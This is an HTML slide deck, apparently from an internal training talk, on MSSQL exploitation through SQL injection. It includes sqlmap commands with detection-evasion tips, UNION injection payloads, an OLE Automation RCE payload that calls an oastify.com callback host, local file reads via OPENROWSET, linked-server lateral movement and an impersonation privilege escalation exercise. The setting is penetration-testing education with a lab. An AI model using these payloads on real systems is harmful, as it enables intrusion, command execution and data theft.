<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MSSQL Exploitation Presentation</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #ffffff;
            overflow: hidden;
        }

        .img-container {
          height: 100%;
          max-height: 475px;
        }

        .img-container img {
          width: 100%;
          height: 100%;
          object-fit: contain;
          object-position: left center; 
        }

        .presentation-container {
            width: 100vw;
            height: 100vh;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .slide {
            width: 1280px;
            height: 720px;
            background: linear-gradient(135deg, #1a1a1a 0%, #0a0a0a 100%);
            border: 2px solid #333;
            border-radius: 8px;
            padding: 60px;
            position: absolute;
            opacity: 0;
            transform: scale(0.95);
            transition: opacity 0.5s ease, transform 0.5s ease;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
        }

        .slide.active {
            opacity: 1;
            transform: scale(1);
            z-index: 10;
        }

        .slide-header {
            border-bottom: 3px solid #d4af37;
            padding-bottom: 20px;
            margin-bottom: 40px;
        }

        .slide-title {
            font-size: 48px;
            font-weight: 700;
            color: #d4af37;
            margin-bottom: 10px;
        }

        .slide-subtitle {
            font-size: 24px;
            color: #888;
            font-weight: 300;
        }

        .content {
            font-size: 20px;
            line-height: 1.8;
        }

        .content h2 {
            font-size: 36px;
            color: #d4af37;
            margin-bottom: 25px;
            font-weight: 600;
        }

        .content h3 {
            font-size: 28px;
            color: #ffd700;
            margin-top: 30px;
            margin-bottom: 15px;
        }

        .content ul {
            list-style: none;
            margin-left: 0;
        }

        .content ul li {
            margin-bottom: 18px;
            line-height: 1.2; 
            padding-left: 30px;
            position: relative;
        }

        .content ul li:before {
            content: "▸";
            position: absolute;
            left: 0;
            color: #d4af37;
            font-weight: bold;
        }

        .code-block {
            background: #1e1e1e;
            border: 1px solid #444;
            border-left: 4px solid #d4af37;
            padding: 20px;
            font-family: 'Courier New', monospace;
            font-size: 16px;
            color: rgb(255, 255, 255);
            margin: 20px 0;
            border-radius: 4px;
            overflow-x: auto;
        }

        .highlight {
            color: #d4af37;
            font-weight: 600;
        }

        .grid-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin-top: 30px;
        }

        .card {
            background: rgba(212, 175, 55, 0.05);
            border: 1px solid #333;
            border-left: 4px solid #d4af37;
            padding: 10px;
            border-radius: 4px;
        }

        .card h4 {
            color: #d4af37;
            font-size: 22px;
            margin-bottom: 15px;
        }

        .navigation {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            gap: 15px;
            z-index: 1000;
        }

        .nav-btn {
            background: #d4af37;
            color: #0a0a0a;
            border: none;
            padding: 12px 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            border-radius: 4px;
            transition: all 0.3s ease;
        }

        .nav-btn:hover {
            background: #ffd700;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(212, 175, 55, 0.3);
        }

        .nav-btn:disabled {
            background: #333;
            color: #666;
            cursor: not-allowed;
            transform: none;
        }

        .slide-counter {
            position: fixed;
            top: 20px;
            right: 30px;
            background: rgba(212, 175, 55, 0.1);
            border: 1px solid #d4af37;
            padding: 10px 20px;
            border-radius: 20px;
            font-size: 14px;
            z-index: 1000;
        }

        .center-content {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100%;
            text-align: center;
        }

        .big-title {
            font-size: 64px;
            font-weight: 700;
            background: linear-gradient(45deg, #d4af37, #ffd700);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 20px;
        }

        .emphasis {
            background: rgba(212, 175, 55, 0.1);
            padding: 4px 10px;
            border-radius: 4px;
            color: #ffd700;
        }

        .attack-flow {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 30px 0;
            font-size: 18px;
        }

        .flow-item {
            flex: 1;
            text-align: center;
            padding: 15px;
            background: rgba(212, 175, 55, 0.05);
            border: 1px solid #333;
            border-radius: 4px;
        }

        .flow-arrow {
            color: #d4af37;
            font-size: 32px;
            margin: 0 10px;
        }

        @media print {
            .navigation, .slide-counter {
                display: none;
            }
        }
    </style>
</head>
<body>
    <div class="presentation-container">
        <!---->
        <div class="slide active" data-slide="">
            <div class="center-content">
                <div class="big-title">MSSQL Exploitation</div>
                <div class="slide-subtitle" style="font-size: 32px; margin-bottom: 40px;">
                    Run Commands Like a Pro
                </div>
                <div style="font-size: 24px; color: #888; margin-top: 30px;">
                    Beyond sqlmap --os-shell and xp_cmdshell
                </div>
                <div style="font-size: 18px; color: #666; margin-top: 50px;">
                    Coffee & Share Session
                </div>
            </div>
        </div>
        <!---->
        <div class="slide active" data-slide="">
            <div class="center-content">
                <div class="big-title">Introduction</div>
            </div>
        </div>
        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">The Problem</div>
            </div>
            <div class="content">
                <h2>Why Go Beyond the Basics?</h2>
                <ul>
                    <li>Everyone knows <span class="emphasis">sqlmap --os-shell</span></li>
                    <li>Everyone tries <span class="emphasis">xp_cmdshell</span> first</li>
                    <li>Modern defenses detect and block common techniques</li>
                    <li>What happens when these don't work?</li>
                    <li><span class="highlight">Real-world scenarios require deeper knowledge</span></li>
                </ul>
                
                <div style="margin-top: 40px; padding: 25px; background: rgba(212, 175, 55, 0.05); border-left: 4px solid #d4af37;">
                    <strong style="color: #d4af37;">Key Insight:</strong> There's a whole arsenal of MSSQL attack vectors beyond the typical techniques
                </div>
            </div>
        </div>

        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">MSSQL Database Basics</div>
            </div>
            <div class="content">
                <h2>What Makes MSSQL Special?</h2>
                <div class="grid-2">
                    <div class="card">
                        <h4>Integration Features</h4>
                        <ul style="font-size: 18px;">
                            <li>Active Directory authentication</li>
                            <li>SQL Authentication mode</li>
                            <li>Seamless Windows integration</li>
                            <li>Linked server capabilities</li>
                        </ul>
                    </div>
                    <div class="card">
                        <h4>Attack Surface</h4>
                        <ul style="font-size: 18px;">
                            <li>Extended stored procedures</li>
                            <li>SQL Server Agent jobs</li>
                            <li>Registry interaction</li>
                            <li>File system access</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Enumeration from Perimeter</div>
            </div>
            <div class="content">
                <h2>Identifying MSSQL</h2>
                <ul>
                    <li><span class="highlight">Force errors</span> - Verbose error messages reveal database type</li>
                    <li><span class="highlight">Technology stack</span> - .NET Core / ASP.NET often uses MSSQL</li>
                    <li><span class="highlight">Web application probing</span> - Test for SQL injection vulnerabilities</li>
                </ul>
                <div style="margin-top: 25px; font-size: 18px;">
                    <strong style="color: #ffd700;">Pro Tip:</strong> The error message "Incorect syntax near..." is typical to Microsoft SQL Server
                    <div style="margin-top: 20px; padding: 20px; background: rgba(212, 175, 55, 0.05); border-left: 4px solid #d4af37;">
                        <strong style="color: #d4af37;">Ex: </strong> SqlException: Incorrect syntax near 'admin'. Unclosed quotation mark after the character string ') AS [m]'.
                    </div>
                </div>
            </div>
        </div>

        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">SQL Injection Context Matters</div>
            </div>
            <div class="content">
                <h2>Not All SQLi Is Created Equal</h2>
                <div class="grid-2">
                    <div class="card">
                        <h4>SQLi Types</h4>
                        <ul style="font-size: 18px;">
                            <li><span class="emphasis">Stacked Query</span></li>
                            <li>Error Based</li>
                            <li>Time Based</li>
                        </ul>
                    </div>
                    <div class="card">
                        <h4>Stacked Query required for:</h4>
                        <ul style="font-size: 18px;">
                            <li>Stored procedures</li>
                            <li>Enabling xp_cmdshell</li>
                        </ul>
                    </div>
                </div>
                <h3 style="margin-top: 30px;">Critical First Steps</h3>
                <div class="code-block">
SELECT current_user; SELECT IS_SRVROLEMEMBER('sysadmin') AS IsSysadmin; EXEC sp_linkedservers;
                </div>
            </div>
        </div>

        <!-- -->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">SQL Injection Context Matters</div>
            </div>
            <div class="content">
                <h2>Not All SQLi Is Created Equal</h2>
                
                <div class="grid-2">
                    <div class="card">
                        <h4>Entity Framework (EF)</h4>
                        <ul style="font-size: 17px;">
                            <li>Strongly typed models</li>
                            <li>Query result validation</li>
                            <li>Limited nested query support</li>
                        </ul>
                    </div>
                    <div class="card">
                        <h4>SqlDataReader</h4>
                        <ul style="font-size: 17px;">
                            <li>Lower-level API</li>
                            <li>No result shape enforcement</li>
                            <li>Supports complex queries</li>
                        </ul>
                    </div>
                </div>
                <div style="margin-top: 25px; font-size: 18px;">
                    <strong style="color: #ffd700;">Pro Tip:</strong> Find multiple injection points with different constraints
                </div>
            </div>
        </div>
        <!---->
        <div class="slide active" data-slide="">
            <div class="center-content">
                <div class="big-title">Controlling The Attack</div>
            </div>
        </div>
        <!-- -->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Controlling the Attack</div>
            </div>
            <div class="content">
                <h2>SQLMap: Manual Queries (<span class="emphasis">--sql-shell</span>)</h2>
                <div class="code-block" style="font-size: 15px;">
sqlmap -u "http://vulnerable/user?id=1" --random-agent --fresh-queries --proxy="http://localhost:8080" --sql-shell <br>
sql-shell> SELECT @@VERSION;<br><br>
SELECT @@version: 'Microsoft SQL Server 2022 (RTM-CU22-GDR) (KB5072936) - 16.0.4230.2 (X64) \\n\\tNov 25 2025 23:31:11 \\n\\tCopyright (C) 2022 Microsoft Corporation\\n\\tDeveloper Edition (64-bit) on Linux (Ubuntu 22.04.5 LTS) <X64>'
                </div>
                <div style="margin-top: 25px; font-size: 18px;">
                    <strong style="color: #ffd700;">Pro Tip:</strong> Use <span class="emphasis">--random-agent</span> default agent is easy to detect and block<br>
                    <strong style="color: #ffd700;">Pro Tip:</strong> Use <span class="emphasis">--fresh-queries</span> to receive the correct value (no cache)<br>
                    <strong style="color: #ffd700;">Pro Tip:</strong> Use <span class="emphasis">--proxy</span> to debug with burp
                </div>
            </div>
        </div>
        <!-- -->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Controlling the Attack</div>
            </div>
            <div class="img-container">
                <img src="./images/sqli_types.png">
            </div>
        </div>
        <!-- -->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Controlling the Attack</div>
            </div>
            <div class="img-container">
                <img src="./images/sql_shell_to_burp.png">
            </div>
        </div>
        <!-- -->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Controlling the Attack</div>
            </div>
            <div class="img-container">
                <img src="./images/sql_shell_to_burp_clean.png">
            </div>
        </div>
        <!-- -->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Controlling the Attack</div>
            </div>
            <div class="img-container">
                <img src="./images/sql_shell_to_burp_enumration.png">
            </div>
        </div>
        <!-- -->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Controlling the Attack</div>
            </div>
            <div class="code-block" style="font-size: 15px;">
                <p>sql-shell> SELECT name, value, value_in_use  FROM <span class="emphasis">sys.configurations</span>;</p><br>
                <p>SELECT * FROM users WHERE id = 1 UNION ALL SELECT NULL,CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT name, value, value_in_use  FROM <span class="emphasis">sys.dbo.configurations</span> FOR JSON AUTO, INCLUDE_NULL_VALUES)+CHAR(113)+CHAR(113)+CHAR(98)+CHAR(98)+CHAR(113),NULL,NULL,NULL-- Wkju</p><br>
                <p>SELECT * FROM users WHERE id = 1 UNION ALL SELECT NULL,CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113)+ISNULL(CAST(name AS VARCHAR(4000)),CHAR(32))+CHAR(106)+CHAR(97)+CHAR(117)+CHAR(111)+CHAR(111)+CHAR(105)+ISNULL(CAST(value AS VARCHAR(4000)),CHAR(32))+CHAR(106)+CHAR(97)+CHAR(117)+CHAR(111)+CHAR(111)+CHAR(105)+ISNULL(CAST(value_in_use  AS VARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(113)+CHAR(98)+CHAR(98)+CHAR(113),NULL,NULL,NULL FROM  <span class="emphasis">sys.dbo.configurations</span>-- hMEW</p><br>
                <p>SELECT * FROM users WHERE id = 1 UNION ALL SELECT NULL,CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT name, value, value_in_use  FROM <span class="emphasis">sys.dbo.configurations</span> FOR JSON AUTO, INCLUDE_NULL_VALUES)+CHAR(113)+CHAR(113)+CHAR(98)+CHAR(98)+CHAR(113),NULL,NULL,NULL-- RwlZ</p><br>
                <p>SELECT * FROM users WHERE id = 1 UNION ALL SELECT NULL,CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113)+ISNULL(CAST(COUNT(*) AS VARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(113)+CHAR(98)+CHAR(98)+CHAR(113),NULL,NULL,NULL FROM <span class="emphasis">sys.dbo.configurations</span>-- QoEf</p><br>
                <p>SELECT * FROM users WHERE id = 1 AND 3220 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT ISNULL(CAST(COUNT(*) AS VARCHAR(4000)),CHAR(32)) FROM <span class="emphasis">sys.dbo.configurations</span>)+CHAR(113)+CHAR(113)+CHAR(98)+CHAR(98)+CHAR(113)))</p>
            </div>
        </div>
        <!-- -->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Controlling the Attack</div>
            </div>
            <div class="content">
                <div class="img-container" style="padding: 0%;">
                    <img src="./images/sql_shell_to_burp_fixing_sp_configuration.png">
                </div>
                <div style="margin-top: 10px; font-size: 18px;">
                    <strong style="color: #ffd700;">Pro Tip:</strong> not all SQLi will have the same verbose level<br>
                </div>
                <ul>
                    <li>start with only one column (i.e.: <span class="emphasis">name</span>)<br>
                    <li style="line-height: 0.5;">If needed, use <span class="emphasis">CAST(value_in_use AS VARCHAR(100))</span> to receive the correct value (no cache)<br>
                </ul>
            </div>
        </div>

        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Quick Reference: SP Alternatives</div>
            </div>
            <div class="content">
                <div style="overflow-x: auto; margin-top: 20px;">
                    <table style="width: 100%; border-collapse: collapse; font-size: 13px;">
                        <thead>
                            <tr style="background: rgba(212, 175, 55, 0.2); border-bottom: 2px solid #d4af37;">
                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Stored Procedure</th>
                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Direct Query Alternative</th>
                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Attack Type</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr style="border-bottom: 1px solid #333; background: rgba(78, 205, 196, 0.05);">
                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">sp_configure</td>
                                <td style="padding: 10px 8px;">SELECT * FROM sys.configurations</td>
                                <td style="padding: 10px 8px;">Configuration Recon</td>
                            </tr>
                            <tr style="border-bottom: 1px solid #333; background: rgba(78, 205, 196, 0.05);">
                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">sp_helplogins</td>
                                <td style="padding: 10px 8px;">SELECT * FROM sys.server_principals</td>
                                <td style="padding: 10px 8px;">Account Discovery</td>
                            </tr>
                            <tr style="border-bottom: 1px solid #333; background: rgba(78, 205, 196, 0.05);">
                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">sp_helpsrvrolemember</td>
                                <td style="padding: 10px 8px;">SELECT * FROM sys.server_role_members</td>
                                <td style="padding: 10px 8px;">Permission Mapping</td>
                            </tr>
                            <tr style="border-bottom: 1px solid #333; background: rgba(78, 205, 196, 0.05);">
                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">sp_databases</td>
                                <td style="padding: 10px 8px;">SELECT name FROM sys.databases</td>
                                <td style="padding: 10px 8px;">Database Enumeration</td>
                            </tr>
                            <tr style="border-bottom: 1px solid #333; background: rgba(78, 205, 196, 0.05);">
                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">sp_helpdb</td>
                                <td style="padding: 10px 8px;">SELECT * FROM sys.master_files</td>
                                <td style="padding: 10px 8px;">File Path Discovery</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        <!---->
        <div class="slide active" data-slide="">
            <div class="center-content">
                <div class="big-title">Ole Automation Procedures (RCE)</div>
            </div>
        </div>
        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Ole Automation Procedures (RCE)</div>
            </div>
            <div class="content">
                <h2>What it is?</h2>
                <ul>
                    <li>SQL Server feature that allows creation and manipulation of OLE/COM objects from MSSQL</li>
                    <li>Disabled by default but often enabled for legacy application compatibility</li>
                    <li>Uses stored procedures: <span class="emphasis">sp_OACreate</span> and <span class="emphasis">sp_OAMethod</span></li>
                    <li>Can instantiate <span class="emphasis">wscript.shell</span> or <span class="emphasis">shell.shell</span> COM objects to execute OS commands</li>
                </ul>
            </div>
        </div>
        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Ole Automation Procedures (RCE)</div>
            </div>
            <div class="content">
                <div style="overflow-x: auto; margin-top: 20px;">
                    <table style="width: 100%; border-collapse: collapse; font-size: 13px;">
                        <thead>
                            <tr style="background: rgba(212, 175, 55, 0.2); border-bottom: 2px solid #d4af37;">
                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Action Rquired</th>
                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Privilege</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr style="border-bottom: 1px solid #333; background: rgba(78, 205, 196, 0.05);">
                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">Execute sp_OACreate</td>
                                <td style="padding: 10px 8px;">Public role (any user)</td>
                            </tr>
                            <tr style="border-bottom: 1px solid #333; background: rgba(78, 205, 196, 0.05);">
                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">Execute sp_OAMethod</td>
                                <td style="padding: 10px 8px;">Public role (any user)</td>
                            </tr>
                            <tr style="border-bottom: 1px solid #333; background: rgba(78, 205, 196, 0.05);">
                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">Enable OLE Automation</td>
                                <td style="padding: 10px 8px;">sysadmin OR alter settings</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
                <div class="code-block" style="font-size: 15px;">
SELECT CONCAT('sysadmin:',IS_SRVROLEMEMBER('sysadmin'),'|ALTER_SETTINGS:',HAS_PERMS_BY_NAME(NULL,NULL,'ALTER SETTINGS'),'|CONTROL_SERVER:',HAS_PERMS_BY_NAME(NULL,NULL,'CONTROL SERVER'),'|OLE_enabled:',CAST((SELECT value_in_use FROM sys.configurations WHERE name='Ole Automation Procedures') AS VARCHAR))
<br>
<br>
                    <strong style="color: #d4af37;">Example Output: "sysadmin:1|ALTER_SETTINGS:1|CONTROL_SERVER:1|OLE_enabled:0"</strong>
                </div>
                <div style="margin-top: 25px; font-size: 18px;">
                    <strong style="color: #d4af37;">Pro Tip:</strong> Use <span class="emphasis">CONCAT</span> to output multiple columns in a single one
                </div>
            </div>
        </div>
        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Quizz Question</div>
            </div>
            <div class="content">
                <h2>Is it possible to get RCE via OLE Automation Procedures if the query below returns? <span class="emphasis">"sysadmin:1|ALTER_SETTINGS:1|CONTROL_SERVER:1|OLE_enabled:0"</span></h2>
                <div></div>
                <div class="code-block" style="font-size: 15px;">
SELECT CONCAT('sysadmin:',IS_SRVROLEMEMBER('sysadmin'),'|ALTER_SETTINGS:',HAS_PERMS_BY_NAME(NULL,NULL,'ALTER SETTINGS'),'|CONTROL_SERVER:',HAS_PERMS_BY_NAME(NULL,NULL,'CONTROL SERVER'),'|OLE_enabled:',CAST((SELECT value_in_use FROM sys.configurations WHERE name='Ole Automation Procedures') AS VARCHAR))
                </div>
            </div>
        </div>
        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Real-World Scenarios</div>
            </div>
            <div class="img-container">
                <img src="./images/sp_oacreate_exec.png">
            </div>
        </div>
        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Real-World Scenarios</div>
            </div>
                <div class="img-container">
                    <img src="./images/select_from_openrowset.png">
                </div>
        </div>
        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Real-World Scenarios</div>
            </div>
                <div class="img-container">
                    <img src="./images/select_from_output.png">
                </div>
        </div>
        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Real-World Scenarios</div>
            </div>
            <div class="content">
                <h3 style="margin-top: 30px;">RCE via OLE stored procedures</h3>
                <div class="code-block">
                    DECLARE @o INT; EXEC sp_OACreate 'wscript.shell',@o OUT; EXEC sp_OAMethod @o,'run',NULL,'cmd /c nslookup AAAA.oastify.com > c:\windows\temp\out.txt';
                </div>
                <h3 style="margin-top: 30px;">Read local files via OPENROWSET</h3>
                <div class="code-block">
                    CREATE TABLE output(data VARCHAR(8000));<br>
                    INSERT INTO output SELECT * FROM OPENROWSET(BULK 'c:\windows\temp\out.txt', SINGLE_CLOB) AS x;<br>
                    UNION SELECT NULL,...,NULL,data FROM output;
                </div>
            </div>
        </div>



        <!---->
        <div class="slide active" data-slide="">
            <div class="center-content">
                <div class="big-title">Linked Server Exploitation</div>
            </div>
        </div>
        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Linked Server Exploitation</div>
            </div>
            <div class="content">
                <h2>Lateral Movement via Database Links</h2>
                
                <h3>What are Linked Servers?</h3>
                <ul>
                    <li>Allow one SQL Server to query another</li>
                    <li>Can connect to different database types (Oracle, MySQL)</li>
                    <li>Often configured with privileged accounts</li>
                    <li><span class="highlight">Perfect for lateral movement</span></li>
                </ul>
            </div>
        </div>
        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Attacking Through Links</div>
            </div>
            <div class="content">
                <h2>Enumerating link servers</h2>
                
                <div class="code-block" style="font-size: 15px;">
                    SELECT * FROM sys.servers WHERE is_linked = 1;
                </div>
                <div class="code-block" style="font-size: 15px;">
                    UNION SELECT NULL,...,CONCAT(name, ' | ', data_source, ' | ', product, ' | RPC:', is_rpc_out_enabled, ' | DA:', is_data_access_enabled) FROM sys.servers WHERE is_linked = 1
                </div>
            </div>
        </div>
        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Linked Server Exploitation</div>
            </div>
            <div class="content">
                <h2>Attack examples</h2>
                <ul>
                    <li>Dump more DBs information</li>
                    <li>Second persistence server (more under radar)</li>
                    <li>Extract SMB hashes [usually require internal access or inital foothold (First MSSQL)]</li>
                </ul>
                <div style="margin-top: 25px; font-size: 18px;">
                    <strong style="color: #ffd700;">Pro Tip:</strong> SQL injection in MSSQL can be exploited to establish persistence through .NET Core-based agents
                    https://github.com/MythicAgents/Athena
                </div>
            </div>
        </div>
        <!-- -->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Real-World Scenarios</div>
            </div>
            <div class="img-container">
                <img src="./images/linked_server_enum.png">
            </div>
        </div>
        <!-- -->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Real-World Scenarios</div>
            </div>
            <div class="img-container">
                <img src="./images/linked_server_pivot.png">
            </div>
        </div>
        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Quizz Question</div>
            </div>
            <div class="content">
                <h2>Scenario:</h2>
                <div>A SQL Server database was found leaked on the dark web. The Incident Response (IR) team informs you that the IT team has already fixed the vulnerability and asks you to retest it to confirm remediation.</div>
                <h2>Question:</h2>
                <div>As a responsible security expert, what proactive validation should you initiate with your colleagues from the IR team?</div>
            </div>
        </div>
        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Quizz Question</div>
            </div>
            <div class="content">
                <h2>Response:</h2>
                <ul>
                    <li>Mapping the complete linked server topology (both directions)</li>
                    <li>Hunting for IOCs across all linked databases</li>
                    <li>Analyzing logs for evidence of lateral movement</li>
                    <li>Checking for persistence mechanisms on each linked server</li>
                    <li>Only then confirming the incident was contained</li>
                </ul>
            </div>
        </div>
        <div class="slide active" data-slide="">
            <div class="center-content">
                <div class="big-title">Testing Lab</div>
            </div>
        </div>
        <!-- -->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Testing Lab</div>
            </div>
            <div class="img-container">
                <img src="./images/testing_lab.png">
            </div>
        </div>
        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Testing Lab</div>
            </div>
            <div class="content">
                <div class="code-block">
                    # Status<br>
kubectl get pods -n pentest-lab<br>
# Delete and recreate<br>
kubectl delete deployment -n pentest-lab vulnerable-app<br>
kubectl apply -f mssql-pentest-lab.yaml<br>
# Forward port to access via browser & cli<br>
kubectl port-forward -n pentest-lab svc/vulnerable-app 5000:5000<br>
kubectl port-forward -n pentest-lab svc/mssql 1433:1433<br>
# Connect to the DB<br>
kubectl exec -it -n pentest-lab deployment/mssql -- /bin/bash<br>
/opt/mssql-tools18/bin/sqlcmd -S localhost -U sa -P 'YourStrong@Passw0rd' -C<br>
# Watch the logs<br>
kubectl logs -n pentest-lab -l app=vulnerable-app -f<br>
                </div>
            </div>
        </div>
        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Exercise: Impersonate Users (MSSQL EoP)</div>
            </div>
            <div class="content">
                <h2>Connect to test MSSQL Server</h2>
                <div class="code-block">
kubectl exec -it -n pentest-lab deployment/mssql -- /bin/bash<br>
/opt/mssql-tools18/bin/sqlcmd -S localhost -U sa -P 'YourStrong@Passw0rd' -C<br>
                </div>
                <h2>Create a vulnerable user</h2>
                <div class="code-block">
USE master;<br>
GO<br>
CREATE LOGIN imp_login WITH PASSWORD = 'P@ssw0rd!';<br>
GO<br>
GRANT IMPERSONATE ON LOGIN::imp_login TO PUBLIC;<br>
GO
                </div>
            </div>

        </div>
        <!---->
        <div class="slide" data-slide="">
            <div class="slide-header">
                <div class="slide-title">Exercise: Impersonate Users (MSSQL EoP)</div>
            </div>
            <div class="content">
                <h2>Search vulnerable users</h2>
                <div class="code-block">
UNION SELECT NULL,NULL,CAST(grantor.name+' CAN IMPERSONATE '+grantee.name AS VARCHAR(200)) COLLATE DATABASE_DEFAULT,NULL,NULL FROM sys.server_permissions p JOIN sys.server_principals grantor ON p.grantor_principal_id=grantor.principal_id JOIN sys.server_principals grantee ON p.grantee_principal_id=grantee.principal_id WHERE p.permission_name='IMPERSONATE'--<br>
<br>
                </div>
                <h2>Impersonate the user</h2>
                <div class="code-block">
EXECUTE AS LOGIN = 'imp_user'; SELECT IS_SRVROLEMEMBER('sysadmin');--
                </div>
            </div>

        </div>

        <!---->
        <div class="slide" data-slide="">
            <div class="center-content">
                <h2 style="font-size: 48px; color: #d4af37; margin-bottom: 40px;">Key Takeaways</h2>
                <div style="text-align: left; max-width: 900px;">
                    <ul style="font-size: 24px; line-height: 2;">
                        <li>MSSQL offers many attack vectors beyond xp_cmdshell</li>
                        <li>SQL Server Agent jobs are powerful and underutilized</li>
                        <li>Linked servers are common and often misconfigured</li>
                        <li>Understanding SQL injection context is critical</li>
                        <li>Post-exploitation tools provide more reliable access</li>
                        <li>Always enumerate thoroughly before exploitation</li>
                    </ul>
                </div>
                <div style="margin-top: 50px; font-size: 28px; color: #ffd700;">
                    <strong>Remember:</strong> Trust but verify!
                </div>
            </div>
        </div>

        <!---->
        <div class="slide" data-slide="">
            <div class="center-content">
                <div class="big-title" style="font-size: 72px;">Thank You!</div>
                <div style="font-size: 32px; color: #888; margin-top: 30px;">
                    Questions?
                </div>
                <div style="margin-top: 60px; font-size: 20px; color: #666;">
                    <p style="margin-top: 15px;">Author: Kevin Carroll</p>
                </div>
                <div style="margin-top: 50px; font-size: 18px; color: #d4af37;">
                    Coffee & Share Session
                </div>
            </div>
        </div>
    </div>

    <div class="slide-counter">
        <span id="current-slide">1</span> / <span id="total-slides">15</span>
    </div>

    <div class="navigation">
        <button class="nav-btn" id="prev-btn">← Previous</button>
        <button class="nav-btn" id="next-btn">Next →</button>
    </div>

    <script>
        let currentSlide = 1;
        const totalSlides = document.querySelectorAll('.slide').length;
        
        document.getElementById('total-slides').textContent = totalSlides;

        function showSlide(n) {
            const slides = document.querySelectorAll('.slide');
            
            if (n > totalSlides) currentSlide = totalSlides;
            if (n < 1) currentSlide = 1;
            
            slides.forEach(slide => slide.classList.remove('active'));
            slides[currentSlide - 1].classList.add('active');
            
            document.getElementById('current-slide').textContent = currentSlide;
            
            document.getElementById('prev-btn').disabled = currentSlide === 1;
            document.getElementById('next-btn').disabled = currentSlide === totalSlides;
        }

        document.getElementById('prev-btn').addEventListener('click', () => {
            currentSlide--;
            showSlide(currentSlide);
        });

        document.getElementById('next-btn').addEventListener('click', () => {
            currentSlide++;
            showSlide(currentSlide);
        });

        document.addEventListener('keydown', (e) => {
            if (e.key === 'ArrowLeft') {
                currentSlide--;
                showSlide(currentSlide);
            } else if (e.key === 'ArrowRight' || e.key === ' ') {
                currentSlide++;
                showSlide(currentSlide);
            }
        });

        showSlide(currentSlide);
    </script>
</body>